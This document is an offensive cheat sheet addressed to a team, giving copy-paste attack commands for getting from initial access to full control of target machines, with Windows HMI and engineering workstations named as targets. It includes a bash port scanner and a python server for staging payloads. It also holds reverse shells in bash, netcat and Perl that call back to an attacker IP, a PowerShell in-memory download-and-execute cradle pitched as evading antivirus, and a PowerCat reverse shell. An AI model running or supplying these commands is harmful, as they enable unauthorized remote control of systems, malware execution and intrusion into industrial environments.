# General-Purpose Scripts & One-Liners

**Authored by: Hex**

Team,

Time is a luxury we don't have. This file contains battle-tested, copy-paste-ready scripts for common tasks. Use them to set up listeners, transfer files, and establish footholds quickly. These are the tools that bridge the gap between initial access and full control.

---

## Bash One-Liners

For use on Linux-based targets or from our own attacker machine.

### Simple Port Scanner
A quick and dirty way to check for open ports on a target without the noise of a full Nmap scan. Useful for a first-pass check.

```bash
# Replace TARGET_IP and iterate through a port range
TARGET_IP=10.10.X.X
for port in {1..1024}; do (echo >/dev/tcp/$TARGET_IP/$port) &>/dev/null && echo "Port $port is open"; done
```

# This will serve files from the directory you run it in on port 8000
python3 -m http.server 8000

Then, on the target machine, you can use wget http://YOUR_ATTACK_IP:8000/file_to_download.


Reverse Shells

The primary goal after gaining command injection. Start your listener first: nc -lvnp [PORT].

Bash:
bash -i >& /dev/tcp/[YOUR_IP]/[PORT] 0>&1

Netcat: (Requires netcat with the -e option, which is often not available)
nc -e /bin/sh [YOUR_IP] [PORT]

Perl: (Often installed on older systems)
perl -e 'use Socket;$i="[YOUR_IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


PowerShell (for Windows Targets)
If we land on a Windows host (like an HMI or Engineering Workstation), PowerShell is our best friend for "living off the land."
Download & Execute in Memory
This is the stealthiest way to run a PowerShell script on a target. It downloads the script and executes it directly in memory without ever touching the disk, making it less likely to be detected by antivirus.


# Host your evil.ps1 script on a web server (using the python one-liner above)
# This command, run on the target, will download and execute it.
powershell -c "(New-Object System.Net.WebClient).DownloadString('http://[YOUR_IP]:8000/evil.ps1') | IEX"

IEX is an alias for Invoke-Expression.


PowerCat Reverse Shell

PowerCat is a powerful PowerShell equivalent of netcat. If you can get it onto the target, it's very effective.

Start a listener on your attacker machine: nc -lvnp 4444
Host the powercat.ps1 script on your web server.

Execute this on the Windows target to download PowerCat and pipe a shell back to you:

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[YOUR_IP]:8000/powercat.ps1');powercat -c [YOUR_IP] -p 4444 -e cmd"

